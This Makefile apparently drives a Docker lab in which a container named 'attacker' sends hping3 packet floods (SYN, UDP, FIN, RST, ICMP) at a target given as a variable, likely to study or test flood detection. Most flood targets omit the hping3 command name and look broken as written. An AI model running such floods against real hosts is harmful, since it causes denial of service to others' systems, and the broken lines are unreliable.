up:
	docker-compose up --build -d

down:
	docker-compose stop

http-f:
	docker exec -it attacker hping3 --fast $(t) 

tcp-syn-f:
	docker exec -it attacker -S -q -n --fast $(t)

udp-f:
	docker exec -it attacker --udp --fast $(t)

tcp-fin-f:
	docker exec -it attacker -F --fast $(t)

tcp-rst-f:
	docker exec -it attacker -r --fast $(t)
	
icmp-f:
	docker exec -it attacker -1 --fast $(t)